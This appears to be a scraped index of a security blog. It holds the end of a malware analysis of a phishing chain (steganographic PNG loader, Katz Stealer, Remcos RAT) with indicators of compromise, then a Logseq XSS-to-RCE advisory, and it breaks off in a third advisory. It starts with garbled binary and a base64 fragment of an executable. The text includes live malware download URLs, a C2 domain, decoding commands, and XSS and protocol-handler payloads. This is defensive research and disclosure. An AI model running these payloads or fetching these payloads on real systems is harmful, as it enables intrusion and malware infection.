H\u0026lt;A4\u0026gt;\u0026lt;9A\u0026gt;I4\u0026lt;92\u0026gt;X\u0026lt;BD\u0026gt;CIII\u0026lt;8B\u0026gt;E\u0026lt;96\u0026gt;44Y\u0026lt;A4\u0026gt;\u0026lt;91\u0026gt;I^T\u0026lt;91\u0026gt;I4\u0026lt;92\u0026gt;i$\u0026lt;D3\u0026gt;ͷ*RA\u0026lt;F8\u0026gt;\u0026lt;90\u0026gt;~$^X\u0026lt;9E\u0026gt;s^VYe\u0026lt;8A\u0026gt;H\u0026lt;A4\u0026gt;\u0026lt;9A\u0026gt;I,\u0026lt;D2\u0026gt;IΜ\u0026lt;A9\u0026gt;^G1e\u0026lt;96\u0026gt;{W\u0026lt;FF\u0026gt;\u0026lt;C4\u0026gt;^@ESC^Q^@^A^D^C^@^@^@^@^@^@^@^@^@^@^@^^@^Q\u0026lt;A0\u0026gt;\u0026lt;B0\u0026gt;\u0026lt;C0\u0026gt;\u0026lt;E0\u0026gt;^A \u0026lt;90\u0026gt;\u0026lt;FF\u0026gt;\u0026lt;DA\u0026gt;^@^H^A^C^A^C?^@\u0026lt;84\u0026gt;Q\u0026lt;8B\u0026gt;\u0026lt;FF\u0026gt;^@\u0026lt;FB\u0026gt;\u0026lt;9A\u0026gt;\u0026lt;A5\u0026gt;o\u0026lt;C5\u0026gt;\u0026lt;EE\u0026gt;a^?\u0026lt;FF\u0026gt;^@\u0026lt;BF\u0026gt;\u0026lt;FF\u0026gt;^@\u0026lt;C5\u0026gt;n)\u0026lt;B7\u0026gt;0\u0026lt;B0\u0026gt;\u0026lt;8F\u0026gt;f^Km\u0026lt;E7\u0026gt;r\u0026lt;BE\u0026gt;\u0026lt;DF\u0026gt;\u0026lt;FF\u0026gt;\u0026lt;D9\u0026gt;BaseStart-TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAD/iN8AAAAAAAAAAOAADiELATAAAIA7AAAIAAAAAAAAbp47AAAgAAAAoDsAAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAADgOwAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAACCeOwBL . . . Steganography is the technique of concealing data within another file or medium in such a way that the presence of the hidden information is not apparent. The approach demonstrated here is a trivial example of steganography, where additional payload data is simply appended to an image file without affecting its normal rendering.\nStage 3 : In-memory .NET Loader and Secondary Payload Fetch To extract and recover the embedded payload a custom Python script was used that searches the file for the BaseStart-(.*?)-BaseEnd pattern, decodes the captured group, and writes the resulting bytes to a file wih a name img_b64_decoded_data. The script used during analysis is shown below.\nimport re import base64 filename = \u0026#34;optimized_MSI_PRO_with_b64.png\u0026#34; with open(filename, \u0026#34;rb\u0026#34;) as f: content = f.read() text_content = content.decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;ignore\u0026#34;) match = re.search(r\u0026#34;BaseStart-(.*?)-BaseEnd\u0026#34;, text_content) if match: base64_data = match.group(1) try: decoded_bytes = base64.b64decode(base64_data) with open(\u0026#34;img_b64_decoded_data\u0026#34;, \u0026#34;wb\u0026#34;) as output_file: output_file.write(decoded_bytes) print(\u0026#34;Base64 data extracted and saved to \u0026#39;img_b64_decoded_data\u0026#39;.\u0026#34;) except base64.binascii.Error as e: print(f\u0026#34;Error decoding: {e}\u0026#34;) else: print(\u0026#34;No Base64 data found.\u0026#34;) Running the custom Python script produced a file that, when checked, is a PE32 executable (DLL).\n$ python3 extract_b64_from_image.py Base64 data extracted and saved to \u0026#39;img_b64_decoded_data\u0026#39;. $ file img_b64_decoded_data img_b64_decoded_data: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections A VirusTotal lookup for the DLL\u0026rsquo;s SHA-256 hash returned detections and reveals that the sample was first submitted on 2025-09-28 19:22:23 UTC. The DLL\u0026rsquo;s version metadata, available in VirusTotal sample\u0026rsquo;s Details tab, claims the product is Microsoft.Win32.TaskScheduler (File Version 2.11.0.0) with the description Provides a single assembly wrapper for the 1.0 and 2.0 versions of Task Scheduler found in all Microsoft operating systems post Windows 98. It simplifies the coding, aggregates .... Searching the internet for this file metadata identified a Github project .NET Task Scheduler Managed Wrapper [5].\nNext, the extracted DLL from the image was loaded into Detect It Easy (DiE) [6]. As shown in the screenshot below, DiE confirms this is a PE32 DLL compiled for .NET Framework 4.5 (VB.NET). The assembly references the dnlib library [7], which frequently indicates runtime assembly manipulation (dynamic loading or unpacking). Heuristics indicate heavy obfuscation and anti-analysis features (anti-debugging).\nFor debug data presence analysis, see Appendix B : PDB File Presence Verification.\nThe de4dot tool [8] was then used for deobfuscation. A .NET Reactor [9] obfuscator was detected, and de4dot attempted to deobfuscate the malicious DLL, saving the result as img_b64_decoded_data-cleaned.dll.\nPS\u0026gt; .\\de4dot.exe img_b64_decoded_data.dll de4dot v3.2.0.0 Detected .NET Reactor (img_b64_decoded_data.dll) Cleaning img_b64_decoded_data.dll Renaming all obfuscated symbols Saving img_b64_decoded_data-cleaned.dll The cleaned assembly img_b64_decoded_data-cleaned.dll was opened in dnSpy [10]. Early in the static analysis, the available resources confirmed that the malicious DLL was built around the .NET Task Scheduler Managed Wrapper.\nAs expected from the analysis of a PowerShell that was built in the dropped JavaScript payload, the method VAI takes 17 parameters:\nQBXtX, startupreg, caminhovbs, namevbs, netframework, nativo, nomenativo, persitencia, url, caminho, nomedoarquivo, extençao, minutos, startuptask, taskname, vmName, startup_onstart Based on the conducted static analysis and correlating the method parameters with the values passed in the PowerShell, the following observations were made:\nparameter QBXtX with value ==gaM5mbx5WQI9SZslmZvkGch9SbvNmLulWYyRGblhXaw9yL6MHc0RHa : encoded reversed Base64 string containing URL for the next stage payload location, parameter startupreg with value '' : flag controlling whether to add persistence via Registry Run key, parameter caminhovbs (Spanish / Portuguese: \u0026ldquo;VBScript path\u0026rdquo;) with value C:\\Users\\Public\\Downloads\\ : filesystem path for dropping a VBS loader, parameter namevbs with value Name_File : name of the VBS file to drop / execute, parameter netframework with value calc : controls whether the loader reflectively executes a managed (.NET) assembly or launches an external process, parameter nativo with value 1 : if non empty, indicates a native executable to drop or execute, parameter nomenativo (Spanish / Portuguese: \u0026ldquo;native name\u0026rdquo;) with value calc : name of the native binary payload, parameter persitencia (Spanish / Portuguese: \u0026ldquo;persistence\u0026rdquo;, with value '' : controlling persistence routines, parameter url with value URL : optional alternate or fallback download URL for payload / config, parameter caminho (Spanish / Portuguese: \u0026ldquo;path\u0026rdquo;) with value C:\\Users\\Public\\Downloads\\ : target path to write dropped payloads, parameter nomedoarquivo (Spanish / Portuguese: \u0026ldquo;filename\u0026rdquo;) with value Name_File : file name for dropped payload, parameter extençao (Spanish / Portuguese: \u0026ldquo;extension\u0026rdquo;) with value js : command to execute dropped payload, parameter minutos (Spanish / Portuguese: \u0026ldquo;minutes\u0026rdquo;) with value 1 : interval for scheduled task recurrence, parameter startuptask with value '' : flag enabling persistence via Task Scheduler, parameter taskname with value Task_Name : name assigned to the scheduled task, parameter vmName with value 0 : string used in VM detection routine, parameter startup_onstart with value startup_onstart : controls whether to run payload on system startup or user logon. Note that the value calc for paramter netframework will evaluate as false, meaning it will take the native (process) execution branch.\nLeveraging the findings and OSINT, close similarities were identified between this sample and a Malware‑as‑a‑Service (MaaS) infostealer known as Katz Stealer. Recently documented Katz samples (from June 2025) abused the legitimate Windows utility cmstp.exe (Microsoft Connection Manager Profile Installer) for UAC bypass, used different configurations (values passed to the VAI method), and loaded the final stealer payload via process hollowing [11] into MSBuild (Microsoft Build Engine). For detailed Katz Stealer capabilities, see references [12], [13], [14].\nStage 4 : Persistent Command and Control Returning to the recovered PowerShell (originally stored in the this.pimaric property of the dropped JavaScript), the $inputArg value was a Base64 encoded reversed string. In the analyzed .NET stage loader, this value was first reversed and then processed further.\n==gaM5mbx5WQI9SZslmZvkGch9SbvNmLulWYyRGblhXaw9yL6MHc0RHa Reversing the string gives a valid Base64 value, which represents a URL after decoding.\nhttps://pixeldrain.com/api/file/HAnqnnLj PixelDrain [15] is a cloud based filesharing and hosting platform.\nRequesting the API URL returned JSON indicating the file was protected by PixelDrain\u0026rsquo;s hotlink / download protection (captcha / rate limit).\n{ \u0026#34;success\u0026#34;: false, \u0026#34;value\u0026#34;: \u0026#34;file_rate_limited_captcha_required\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;We have detected the use of hotlinking for this file. Hotlinking is only supported when either the uploader or the downloader has a paid subscription\u0026#34; } Studying PixelDrain\u0026rsquo;s API documentation [16] revealed two useful endpoints. The file info endpoint for HAnqnnLj returned:\n$ curl https://pixeldrain.com/api/file/HAnqnnLj/info { \u0026#34;success\u0026#34;: true, \u0026#34;id\u0026#34;: \u0026#34;HAnqnnLj\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;arquivo_20250929134616.txt\u0026#34;, \u0026#34;size\u0026#34;: 641024, \u0026#34;views\u0026#34;: 0, \u0026#34;bandwidth_used\u0026#34;: 2564096, \u0026#34;bandwidth_used_paid\u0026#34;: 0, \u0026#34;downloads\u0026#34;: 2, \u0026#34;date_upload\u0026#34;: \u0026#34;2025-09-29T06:46:17.479Z\u0026#34;, \u0026#34;date_last_view\u0026#34;: \u0026#34;2025-09-29T06:46:17.479Z\u0026#34;, \u0026#34;mime_type\u0026#34;: \u0026#34;text/plain; charset=utf-8\u0026#34;, \u0026#34;thumbnail_href\u0026#34;: \u0026#34;/file/HAnqnnLj/thumbnail\u0026#34;, \u0026#34;hash_sha256\u0026#34;: \u0026#34;11cd328b43b236bd82149abdc709c505adf0ecc7a3537c5c1f945873e80566b8\u0026#34;, \u0026#34;delete_after_date\u0026#34;: \u0026#34;0001-01-01T00:00:00Z\u0026#34;, \u0026#34;delete_after_downloads\u0026#34;: 0, \u0026#34;availability\u0026#34;: \u0026#34;file_rate_limited_captcha_required\u0026#34;, \u0026#34;availability_message\u0026#34;: \u0026#34;We have detected the use of hotlinking for this file. Hotlinking is only supported when either the uploader or the downloader has a paid subscription\u0026#34;, \u0026#34;abuse_type\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;abuse_reporter_name\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;can_edit\u0026#34;: false, \u0026#34;can_download\u0026#34;: true, \u0026#34;show_ads\u0026#34;: true, \u0026#34;allow_video_player\u0026#34;: true, \u0026#34;download_speed_limit\u0026#34;: 0 } Note the filename arquivo_20250929134616.txt, arquivo is Spanish / Portuguese for \u0026ldquo;file\u0026rdquo;. The use of Spanish / Portuguese in the filename correlates with Spanish / Portuguese language comments found in the dropped JavaScript (Adobe873768.js) and variable names in the analyzed .NET loader (img_b64_decoded_data ; Microsoft.Win32.TaskScheduler.dll) , observed earlier in the infection chain.\nVisiting the direct download endpoint in a browser allowed the malicious file to be fetched manually. It is unclear whether the threat actor accounted for PixelDrain\u0026rsquo;s limitations that PixelDrain can enforce on the hosted files with free hosting. PixelDrain indicated the file had been downloaded many times outside the service\u0026rsquo;s file view page. It is likely that rate limiting (captcha) protection was applied during the malicious activity.\nAfter manually downloading the file, analysis continued. Initial inspection revealed that the downloaded file consisted of a single line of Base64 encoded data.\n$ file arquivo_20250929134616.txt arquivo_20250929134616.txt: ASCII text, with very long lines (65536), with no line terminators $ head -n 1 arquivo_20250929134616.txt AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPYyDe8wFP8wDH7g/OsvDz7A6OEuDZ7Q0OgsDA6wtO8qDn6wnOcpDN . . . Based on analysis of the .NET stage loader, the DLL loaded in memory invoked Strings.StrReverse(text) on the downloaded content before interpreting it. Therefore the single long line of encoded Base64 data in the downloaded file had to be reversed.\nThe next steps reversed the single long line of characters, Base64 decoded the reversed string, and inspected the resulting bytes. From that output, a PE32 executable was successfully recovered.\n$ rev arquivo_20250929134616.txt | base64 -d \u0026gt; payload $ file payload payload: PE32 executable (GUI) Intel 80386, for MS Windows, 7 sections $ xxd -g 1 -l 64 payload 00000000: 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 00000010: b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 10 01 00 00 ................ The recovered payload was further verified using the Detect It Easy (DiE) tool and confirmed to be a PE32 executable built with Microsoft Visual Studio 2015.\nAt this point, leveraging the collected evidence and indicators of compromise, the recovered PE32 executable was identified as the Remote Access Trojan Remcos [17]. In this case, and based on the previously stated findings, the sample was configured to execute under the name calc.exe.\nDetonating the Remcos sample in the sandbox allowed us to determine the C2 domain used:\ncnn9001.duckdns.org Complete analysis based on sandbox execution can be found on Recorded Future Triage [18] and VirusTotal [19].\nConclusion This investigation reconstructed a complete, multistage infection chain that began with a low effort phishing message and culminated in the in-memory execution of a .NET loader identified as Katz Stealer and deployment of a commodity Remote Access Trojan Remcos. The attack combined simple social engineering, heavily obfuscated JavaScript, an obfuscated PowerShell downloader, in-memory .NET assembly loading, and staged payload retrieval from benign looking hosting services. Because the loader performed assembly loading and reflection in memory and used legitimate cloud hosting for staging, disk artifacts were minimized, increasing the likelihood of evading conventional detection.\nSpanish or Portuguese language artifacts were present in the sample (comments, filenames, and parameter names), suggesting regionalized tooling or actor influence. However, the observed target was not Spanish or Portuguese speaking, indicating that the threat actor likely acted opportunistically. Recorded Future\u0026rsquo;s TAG‑144 reporting [20] on South American campaigns documents extensive abuse of legitimate internet services for staging (including archive.org and dynamic DNS providers such as duckdns.org) and the use of steganography in images during multistage infections, closely mirroring the hosting and staging choices seen in this sample. Open source analyses of Katz Stealer (by SentinelOne, Nextron Systems, Picus Security) describe it as a MaaS focused on credential and crypto theft that leverages flexible loaders, runtime assembly manipulation, and process injection techniques, behaviors consistent with the obfuscated .NET loader and staged payload retrieval analyzed in this post.\nIndicators of Compromise (IoCs) Email Sender\nCategory Value Email Sender perfecttradedr@gmail.com URL (Malware Distribution)\nCategory Value JavaScript Dropper https://www.cekomng.shop/ .NET Stage Loader http://archive.org/download/optimized_msi_pro_with_b64_202509/optimized_MSI_PRO_with_b64.png Remcos RAT https://pixeldrain.com/api/file/HAnqnnLj Command and Control (C2)\nCategory Value C2 (domain:port) cnn9001.duckdns.org:9001 C2 (domain) cnn9001.duckdns.org C2 (IP) 45.74.50.189 Malware Files / Artifacts\nFilename / Artifact MD5 SHA-1 SHA-256 Adobe873768.js b8d438afe388b67a83bcdc24a22b2f12 15191bdd103868f69281476e157e2ee3c916c454 4bc9d610dfdc799425d7dff0d37d47d6013163c943bb0c86b90de99786c43461 optimized_MSI_PRO_with_b64.png d21d147d79518f4f89f2bed612f5ede4 ca6d4bd26cb6abf0c73981ff22af8d65fba60403 b932adbdbb14644366daed1bede62d9293868c9a3eecbffc7c4e6604d6d5b243 img_b64_decoded_data (Microsoft.Win32.TaskScheduler.dll) 1517ce8a9d9ff6d0ddbe3c6616061e3b 93c482b74081dec2e97422ff7d9561cb67def712 c3560bfa9483e7894243e613c55744b7f1705a53969f797f5fe8b2cb4fb336cc arquivo_20250929134616.txt b16a2e0d784b78e9ee39d3363518220d fcda7a3f417c516df41eee6565ad371fe8a05771 11cd328b43b236bd82149abdc709c505adf0ecc7a3537c5c1f945873e80566b8 payload (calc.exe) 86c7ba0e15c0a1c084ef0daba53e4ecf bba3d78e42c0e7eb65a0cd63917c767e2b841908 3ab3bc06210e76b06e75c264e5f5acb4edc11f0f768ed16655181cfda80a72a8 Appendices Appendix A : CEKOMNG.SHOP WHOIS Record Domain Name: CEKOMNG.SHOP Registry Domain ID: DO14938844-GMO Registrar WHOIS Server: whois.hostinger.com Registrar URL: https://www.hostinger.com/ Updated Date: 2025-09-14T08:00:37.0Z Creation Date: 2025-09-14T08:00:26.0Z Registry Expiry Date: 2026-09-14T23:59:59.0Z Registrar: HOSTINGER operations, UAB Registrar IANA ID: 1636 Registrar Abuse Contact Email: abuse@hostinger.com Registrar Abuse Contact Phone: Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Registrant State/Province: MA Registrant Country: US Registrant Email: Admin Email: Tech Email: Name Server: NS2.DNS-PARKING.COM Name Server: NS1.DNS-PARKING.COM DNSSEC: unsigned URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/ \u0026gt;\u0026gt;\u0026gt; Last update of WHOIS database: 2025-09-29T12:07:49.0Z \u0026lt;\u0026lt;\u0026lt; Appendix B : PDB File Presence Verification A PDB (Program Database) [21] file is a debug symbol file used by Microsoft compilers to store function names, variable names, and source file paths to aid debugging and analysis.\nAs we know from the DiE analysis output, the debug data in the file img_b64_decoded_data (Microsoft.Win32.TaskScheduler.dll) has offset 0x003b7fde and size 0x3a (58 bytes).\n$ dd if=img_b64_decoded_data of=img_b64_decoded_data_debug.bin bs=1 skip=0x3b7fde count=0x3a status=none $ hexdump -C img_b64_decoded_data_debug.bin | sed -n \u0026#39;1,4p\u0026#39; 00000000 52 53 44 53 80 b7 84 65 6a 14 03 4b 8a e3 65 c4 |RSDS...ej..K..e.| 00000010 66 f2 25 32 01 00 00 00 4d 69 63 72 6f 73 6f 66 |f.%2....Microsof| 00000020 74 2e 57 69 6e 33 32 2e 54 61 73 6b 53 63 68 65 |t.Win32.TaskSche| 00000030 64 75 6c 65 72 2e 70 64 62 00 |duler.pdb.| These 58 bytes in question form a CodeView (RSDS) debug pointer [22]. Meaning it is a pointer (CodeView record) that typically tells debuggers where to find a matching PDB (GUID + age + filename). So we do not have a full PDB embedded, just a pointer to a PDB.\nReferences [01] ActiveX Objects : https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms221401(v=vs.85) [02] Windows Management Instrumentation (WMI) : https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page [03] Invoke-Expression : https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5 [04] Reflective Code Loading : https://attack.mitre.org/techniques/T1620/ [05] Task Scheduler Managed Wrapper : https://github.com/dahall/TaskScheduler [06] Detect It Easy (DiE) : https://github.com/horsicq/Detect-It-Easy [07] dnlib : (https://github.com/0xd4d/dnlib) [08] de4dot : https://github.com/de4dot/de4dot [09] .NET Reactor Obfuscator : https://www.eziriz.com/dotnet_reactor.htm [10] dnSpy : https://dnspy.org/ [11] Process Injection - Process Hollowing : https://attack.mitre.org/techniques/T1055/012/ [12] Understanding Katz Stealer Malware and Its Credential Theft Capabilities (Picus Security) : https://www.picussecurity.com/resource/blog/understanding-katz-stealer-malware-and-its-credential-theft-capabilities [13] Katz Stealer | Powerful MaaS On the Prowl for Credentials and Crypto Assets (SentinelOne) : https://www.sentinelone.com/blog/katz-stealer-powerful-maas-on-the-prowl-for-credentials-and-crypto-assets/ [14] Katz Stealer Threat Analysis (Nextron) : https://www.nextron-systems.com/2025/05/23/katz-stealer-threat-analysis/ [15] PixelDrain : https://pixeldrain.com/ [16] PixelDrain API Documentation : https://pixeldrain.com/api [17] Dissecting REMCOS RAT : https://www.elastic.co/security-labs/dissecting-remcos-rat-part-one [18] Recorded Future Triage (Sample Analysis) : https://tria.ge/250914-l68nhatzft/ [19] VirusTotal (Sample Analysis) : https://www.virustotal.com/gui/file/3ab3bc06210e76b06e75c264e5f5acb4edc11f0f768ed16655181cfda80a72a8 [20] TAG-144\u0026rsquo;s Persistent Grip on South American Organizations : https://www.recordedfuture.com/research/tag-144s-persistent-grip-on-south-american-organizations [21] Program Database (.PDB) Files : https://learn.microsoft.com/en-us/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2022 [22] The RSDS PDF Format : https://www.godevtool.com/Other/pdb.htm ","permalink":"https://martinkubecka.sk/posts/2025-10-06-unsophisticated-phishing-delivering-sophisticated-malware/","summary":"Executive Summary A phishing campaign was observed delivering a staged malware chain that could potentially have led to remote access compromise. An attacker sent a phishing message from perfecttradedr@gmail.com linking to https://www.cekomng.shop/. A user who visited the site received and executed an obfuscated JavaScript dropper (Adobe873768.js). The JavaScript launched an obfuscated PowerShell downloader which retrieved an image from archive.org that contained an embedded Base64 payload. That payload was decoded and loaded in-memory as a .","title":"Unsophisticated Phishing Delivering Sophisticated Malware"},{"content":"Vulnerability Summary During security testing of the Logseq (Desktop/Android) application [1][2], version 0.10.9, a critical-severity DOM-based Cross-Site Scripting (XSS) vulnerability [3] was identified in the marketplace.html endpoint. An attacker can host a malicious Logseq plugin on GitHub with JavaScript embedded in the plugin\u0026rsquo;s README.md. When this README is rendered inside the Logseq plugin marketplace, unsanitized input from the document location is directly injected into innerHTML which results in arbitrary JavaScript execution. Furthermore, the absence of an allowlist for shell.openExternal (exposed via window.cljs) allows this DOM-based XSS to escalate to Remote Code Execution (RCE) [4] by abusing system-level protocol handlers.\nTechnical Details DOM-based Cross-Site Scripting (XSS) in the marketplace for plugins File: resources/app/marketplace.html Line: 82 Description: Unsanitized input from the document\u0026rsquo;s location (URL parameters) is directly injected into the DOM using innerHTML, which can lead to DOM-based XSS (DOMXSS). The rendered README.md content from an attacker-controlled GitHub repository is parsed and inserted into the page without proper sanitization. Vulnerability Explanation: The application parses the plugin\u0026rsquo;s Github repository README content using marked.parse() and immediately injects it into the DOM via innerHTML (setContent(content)), without applying any HTML sanitization. If an attacker embeds arbitrary JavaScript into the README file of their plugin Github repository, the code will be executed. This attack is DOM-based because the payload is executed client-side and relies on dynamic manipulation of the repo parameter in the URL. . . . \u0026lt;script\u0026gt; ;(async function () { const app = document.getElementById(\u0026#39;app\u0026#39;) const url = new URL(location.href) const setMsg = (msg) =\u0026gt; app.innerHTML = `\u0026lt;strong\u0026gt;${msg}\u0026lt;/strong\u0026gt;` const repo = url.searchParams.get(\u0026#39;repo\u0026#39;) if (!repo) { return setMsg(\u0026#39;Repo parameter not found!\u0026#39;) } const setContent = (content) =\u0026gt; app.innerHTML = `\u0026lt;main class=\u0026#34;markdown-body\u0026#34;\u0026gt;${content}\u0026lt;/main\u0026gt;` const endpoint = (repo, branch, file) =\u0026gt; `https://raw.githubusercontent.com/${repo}/${branch}/${file}` . . . content = marked.parse(content).replace(\u0026#39;src=\u0026#34;./\u0026#39;, `src=\u0026#34;${fixLink(\u0026#39;\u0026#39;)}`) setContent(content) }()) \u0026lt;/script\u0026gt; . . . Lack of Protocol Validation in Electron\u0026rsquo;s Window Logic File: src/electron/electron/window.cljs Line: 133 Description: The function open-default-app! calls shell.openExternal to open external URLs, but only filters for a basic set of protocols (http, https, mailto) in a limited conditional. There is no comprehensive allowlist to prevent invoking custom or system-level protocol handlers, leaving the application vulnerable to abuse. Vulnerability Explanation: Electron\u0026rsquo;s shell.openExternal() has the ability to invoke OS-level protocol handlers. Since there is no strict allowlist enforced here, an attacker who gains JavaScript execution via the aforementioned DOM-based XSS can craft a payload that performs Remote Code Execution (RCE) via system-level protocols. . . . (defn- open-default-app! [url default-open] (let [URL (.-URL URL) parsed-url (try (URL. url) (catch :default _ nil))] (if (and parsed-url (contains? #{\u0026#34;https:\u0026#34; \u0026#34;http:\u0026#34; \u0026#34;mailto:\u0026#34;} (.-protocol parsed-url))) (.openExternal shell url) (when default-open (default-open url))))) . . . CVSS v3.1 Metrics Metric Value Base Score 9.6 (Critical) Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H Weakness Enumeration CWE ID Description CWE-79 Improper Neutralization of Input During Web Page Generation (\u0026lsquo;Cross-site Scripting\u0026rsquo;) CWE-20 Improper Input Validation (covers the insufficient validation of the repo parameter and lack of filtering in protocol handling) CWE-116 Improper Encoding or Escaping of Output (specific to the unsafe use of innerHTML without sanitization) CWE-184 Incomplete List of Disallowed Inputs (the protocol filter only included a few values instead of using a secure allowlist) CWE-94 Improper Control of Generation of Code (\u0026lsquo;Code Injection\u0026rsquo;) (Arbitrary JavaScript execution, which then calls OS level protocols, effectively becomes code injection) CWE-749 Exposed Dangerous Method or Function (the exposure of shell.openExternal without restriction) Proof of Concept (PoC) Exploit Logseq Desktop/Android application version 0.10.9 was tested on Microsoft Windows 10 and Microsoft Windows 11. For demonstration purposes, Developer Mode must be enabled. To do so, open the application, click on More ( ... icon), select Settings, go to Advanced and enable Developer mode. PoC Github repository: https://github.com/martinkubecka/Logseq-XSS-RCE-PoC PoC video demonstration: https://www.youtube.com/watch?v=cBP4TA-BioY Steps to Reproduce Launch the Logseq application. In the upper-right corner, click on More ( ... icon), choose Plugins, then open the Marketplace. Click on any available plugin, for example: Journals Calendar. Press Ctrl + Shift + I to open DevTools and navigate to the Console tab. Paste and execute the following code to load the malicious README from an attacker-controlled GitHub repository. document.querySelector(\u0026#34;iframe.lsp-frame-readme\u0026#34;).src = \u0026#34;lsp://logseq.com/marketplace.html?repo=martinkubecka/Logseq-Testing\u0026#34;; After executing the command above:\nThe iframe.lsp-frame-readme source is changed to load the README file from the martinkubecka/Logseq-XSS-RCE-PoC GitHub repository. This README contains a benign proof-of-concept demonstrating:\nA basic XSS payload: \u0026lt;img src=x onerror=\u0026quot;alert('XSS')\u0026quot;\u0026gt;. A chained XSS to RCE payload using a demonstration system protocol handler, resulting in the calculator app being executed on Windows system: \u0026lt;img src=x onerror=\u0026quot;window.location='ms-calculator://'\u0026quot;\u0026gt;. This PoC demonstrates on a benign example the critical impact of unsanitized user input combined with insufficient protocol filtering.\nRecommended Mitigations To address the DOM-based XSS and RCE risks stemming from the combination of unsanitized HTML rendering and protocol misuse, the following mitigations are recommended:\nSanitize rendered plugin README content in marketplace.html: Input from the repo query parameter is fetched from GitHub and injected directly into the DOM via innerHTML after being parsed by marked.parse(). This content should be sanitized before being inserted. Implement protocol allowlisting in window.cljs: Introduce a strict allowlist of supported protocols and explicitly block others, especially system-level handlers unless explicitly needed for functionality. Vendor Response \u0026amp; Patch Information The Logseq development team responded promptly to the reported DOM-based XSS vulnerability by integrating the DOMPurify [5] library to sanitize plugin README content rendered in the marketplace. This change mitigates the risk of arbitrary JavaScript execution originating from attacker-controlled plugin metadata.\nThe fix was incorporated in the release based on the Logseq DB branch. Relevant code changes include:\nAddition of the dompurify library to the build process in gulpfile.js. Inclusion of purify.js in the HTML rendering logic in resources/marketplace.html. Sanitization of parsed README content using DOMPurify.sanitize() before injection into the DOM. A minor update in plugins.cljs to ensure correct iframe source resolution. The patch can be reviewed in this GitHub commit.\nWhile the DOM-based XSS was addressed effectively, the second issue, Lack of Protocol Validation in Electron\u0026rsquo;s Window Logic, remained unresolved at the time of patch confirmation. On April 29th, 2025, this concern was explicitly communicated to the Logseq support team along with a recommendation to assign CVE ID(s) to both vulnerabilities.\nAlthough system-level protocol handlers are not implemented by the Logseq application itself, the lack of strict validation in its shell.openExternal usage enables attackers to exploit them [6]. Electron\u0026rsquo;s shell.openExternal() API delegates URL handling to the underlying operating system [7]. Once an attacker achieves JavaScript execution, they can invoke handlers such as search-ms:, ms-excel:, or ms-word: to execute arbitrary commands or launch native applications [8]. For instance, abuse of the search-ms: handler has enabled attackers to remotely execute files from SMB shares via malicious search window shortcuts [9]. The infamous Follina vulnerability exploited the ms-msdt: protocol to achieve code execution through a crafted Office document [10]. Likewise, protocols like ms-excel: and ms-word: have been weaponized in phishing campaigns to silently launch Office apps with remote templates [11]. Without proper validation and the use of security best practices, even Electron applications that appear sandboxed can be exploited to interact with the underlying operating system in unintended and potentially high-risk ways.\nReferences [1] https://logseq.com/ [2] https://github.com/logseq/logseq [3] https://portswigger.net/web-security/cross-site-scripting/dom-based [4] https://www.splunk.com/en_us/blog/learn/rce-remote-code-execution.html [5] https://github.com/cure53/DOMPurify [6] https://benjamin-altpeter.de/shell-openexternal-dangers/ [7] https://www.electronjs.org/docs/latest/tutorial/security#15-do-not-use-shellopenexternal-with-untrusted-content [8] https://positive.security/blog/url-open-rce [9] https://www.bleepingcomputer.com/news/security/new-windows-search-zero-day-added-to-microsoft-protocol-nightmare/ [10] https://www.splunk.com/en_us/blog/security/follina-for-protocol-handlers.html [11] https://blog.syss.com/posts/abusing-ms-office-protos/ Timeline 2025-04-23: I disclosed the vulnerabilities to the Logseq support team. 2025-04-25: The Logseq support team acknowledged the findings and addressed the DOM-based Cross-Site Scripting (XSS) vulnerability with a fix. 2025-04-29: I confirmed the patch for the DOM-based XSS and notified the Logseq support team that the Lack of Protocol Validation in Electron\u0026rsquo;s Window Logic remained unaddressed, I also recommended assigning CVE ID(s) to these findings. 2025-07-08: Due to no follow-up from the Logseq support team regarding the second vulnerability and CVE assignment, I requested CVE ID(s) directly from MITRE. 2025-09-30: CVE ID assigned. 2025-10-01: Public release of the security advisory. ","permalink":"https://martinkubecka.sk/security-advisories/cve-2025-56683/","summary":"Vulnerability Summary During security testing of the Logseq (Desktop/Android) application [1][2], version 0.10.9, a critical-severity DOM-based Cross-Site Scripting (XSS) vulnerability [3] was identified in the marketplace.html endpoint. An attacker can host a malicious Logseq plugin on GitHub with JavaScript embedded in the plugin\u0026rsquo;s README.md. When this README is rendered inside the Logseq plugin marketplace, unsanitized input from the document location is directly injected into innerHTML which results in arbitrary JavaScript execution.","title":"CVE-2025-56683: DOM-based Cross-Site Scripting Leading to Remote Code Execution in Logseq Application"},{"content":"Vulnerability Summary A Reflected Cross-Site Scripting (XSS) vulnerability exists in Combodo iTop version \u0026lt; 3.0.4 and \u0026gt;= 3.1.0, 